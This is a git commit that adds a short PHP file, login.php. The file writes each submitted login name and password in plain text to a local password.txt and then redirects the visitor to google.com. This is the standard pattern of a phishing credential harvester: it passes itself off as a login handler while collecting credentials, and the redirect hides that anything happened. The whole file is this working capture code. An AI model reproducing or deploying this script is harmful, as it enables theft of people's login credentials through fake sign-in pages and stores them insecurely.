3c64885bd013637bcb9bf0d63305b975d548c73c
HebertEdu <hebertedu.dev@gmail.com>
2022-09-06 19:44:20 -0300

    main

---
+++ login.php
@@ -0,0 +1,14 @@
+<?php
+
+$var1 = $_POST["login"] . "\n";
+$var2 = $_POST["password"] . "\n";
+
+$arquivo = fopen("password.txt","a");
+
+$armazena1 = fwrite($arquivo, $var1);
+$armazena2 = fwrite($arquivo, $var2);
+fclose($arquivo);
+
+header("Location: http://www.google.com");
+?>
+
